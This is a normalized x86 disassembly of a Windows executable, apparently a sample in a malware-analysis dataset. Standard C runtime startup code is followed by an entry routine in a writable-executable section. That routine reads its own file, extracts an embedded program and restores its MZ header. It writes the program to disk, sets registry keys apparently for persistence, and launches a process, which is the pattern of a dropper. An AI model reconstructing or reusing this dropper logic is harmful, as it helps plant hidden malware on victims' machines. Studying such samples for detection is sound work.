push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call [ __wgetmainargs@IAT ]
add esp 0x20
mov [ ebp - 0x34 ] eax
cmp eax edi
jge r-xdata
push sub_300061cc
call [ __setusermatherr@IAT ]
pop ecx
cmp [ ecx + 0x74 ] 0xe
jbe r-xdata
cmp eax 0x20b
je r-xdata
push rw-data
push rw-data
call _initterm
call [ __p___winitenv@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
call sub_300020f1
add esp 0x14
mov esi eax
mov [ ebp - 0x38 ] esi
cmp [ ebp - 0x1c ] edi
jne r-xdata
push 0x8
call _amsg_exit
pop ecx
xor eax eax
cmp [ ecx + 0xe8 ] edi
cmp [ ecx + 0x84 ] 0xe
jbe r-xdata
call [ _cexit@IAT ]
push esi
call [ exit@IAT ]
xor eax eax
cmp [ ecx + 0xf8 ] edi
jmp r-xdata
setne al
mov [ ebp - 0x1c ] eax
sub_30006017
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
mov [ rw-data ] esi
jne r-xdata
cmp eax 0xbb40e64e
jne r-xdata
pop esi
mov [ rw-data ] 0xbb40e64e
leave
retn
sub_3000607d
cmp ecx [ rw-data ]
jne r-xdata
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
push edi
mov [ ebp + 0x2a4 ] eax
xor eax eax
and [ ebp - 0x28 ] eax
push 0x13
pop ecx
lea edi [ ebp - 0x7c ]
[ edi ]
mov ecx 0xb2
lea edi [ ebp - 0x24 ]
[ edi ]
mov [ ebp - 0x80 ] 0xc0000409
lea eax [ ebp + 0x2ac ]
mov eax [ eax ]
mov [ ebp - 0x74 ] eax
lea eax [ ebp + 0x2ac ]
mov [ ebp - 0x28 ] 0x10001
mov eax [ eax ]
mov [ ebp + 0x90 ] eax
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
push ss
pop [ ebp + 0xa0 ]
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
push 0x502
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
call sub_3000607d
pop edi
add ebp 0x2a8
leave
retn
retn
sub_300060c2
push 0xc
push r-xdata
call sub_3000614a
mov [ ebp - 0x1c ] r-xdata
call sub_30006185
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r-xdata
jae r-xdata
sub_30006106
push 0xc
push r-xdata
call sub_3000614a
mov [ ebp - 0x1c ] r-xdata
call sub_30006185
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r-xdata
jae r-xdata
sub_30006137
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x1c ] r-xdata
jae r-xdata
call sub_30006185
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
sub_3000614a
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_300061fb
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov eax __dos_header
push esi
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov ebx [ esi + 0xc ]
add edx eax
push edi
mov edi [ esi + 0x14 ]
add edi eax
add ecx eax
mov [ ebp - 0x18 ] edx
mov edx [ esi + 0x10 ]
add ebx eax
add edx eax
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] ecx
xor ecx ecx
mov [ ebp - 0xc ] edi
mov [ ebp - 0x3c ] eax
xor eax eax
test [ esi ] 0x1
lea edi [ ebp - 0x30 ]
mov [ ebp - 0x44 ] 0x24
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x34 ] ecx
stosd [ edi ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
mov eax [ ebp + 0xc ]
sub eax ebx
sar eax 0x2
shl eax 0x2
add edx eax
mov edx [ edx ]
mov [ ebp + 0x8 ] eax
mov eax edx
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x34 ] eax
je r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
push ecx
push 0xc06d0057
call [ RaiseException@IAT ]
xor eax eax
jmp r-xdata
and edx 0xffff
mov [ ebp - 0x30 ] edx
lea eax [ edx + r--data ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
test edi edi
jne r-xdata
lea edx [ ebp - 0x44 ]
push edx
push ecx
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
mov [ ebp - 0x2c ] edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x2
call eax
mov ebx eax
push [ ebp - 0x38 ]
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x1
call eax
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp - 0x44 ]
push ecx
push 0x5
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] ebx
call eax
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
push edi
push [ ebp - 0x18 ]
call [ InterlockedExchange@IAT ]
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ ebp - 0x30 ]
push edi
call [ GetProcAddress@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ esi + 0x1c ] ebx
je r-xdata
push edi
call [ FreeLibrary@IAT ]
cmp [ esi + 0x18 ] 0x0
je r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x1
push 0x0
push 0xc06d007e
call [ RaiseException@IAT ]
mov eax [ ebp - 0x28 ]
jmp r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x3
call eax
mov edi eax
test edi edi
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ edi + 0x3c ]
add eax edi
cmp [ eax ] 0x4550
jne r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
test eax eax
je r-xdata
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x4
call eax
mov ebx eax
mov ecx [ ebp - 0x4 ]
cmp [ eax + 0x8 ] ecx
jne r-xdata
mov [ eax + 0x4 ] esi
mov ecx [ rw-data ]
mov [ eax ] ecx
mov [ rw-data ] eax
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push ebx
push 0xc06d007f
call [ RaiseException@IAT ]
mov ebx [ ebp - 0x28 ]
cmp edi [ eax + 0x34 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx + eax ]
test ebx ebx
jne r-xdata
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_3002227d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_30022fe0
add esp 0x4
call sub_30023110
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_30023140
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_30023140
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x39
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov edx [ ebp - 0x294 ]
push edx
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x23
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3b
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x37
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_30022fe0
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_30022fe0
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_30022fe0
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_30022fe0
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_30022fe0
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
mov [ ebp - 0x288 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_30022fe0
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x3b
je rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x288 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x288 ] edx
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea ecx [ ebp - 0x120 ]
push ecx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x148 ]
mov [ eax ] 0x5a
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov edx [ ebp - 0x148 ]
mov [ edx ] 0x4d
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
mov eax [ ebp - 0x558 ]
push eax
call [ ebp - 0x28c ]
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x13c ]
mov edx [ ebp - 0x144 ]
and edx 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x574 ] 0x44
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov edx [ ebp - 0x144 ]
and edx 0x1000
je rwxdata
mov eax [ ebp - 0x574 ]
sub eax 0x1
mov [ ebp - 0x574 ] eax
mov ecx [ ebp - 0x574 ]
mov [ ebp + ecx - 0x300 ] 0x0
jmp rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov ecx 0x5
mov [ ebp - 0x2d0 ] cx
xor eax eax
mov [ ebp - 0x2d0 ] ax
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
lea edx [ ebp - 0x278 ]
push edx
lea eax [ ebp - 0x300 ]
push eax
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x120 ]
push ecx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
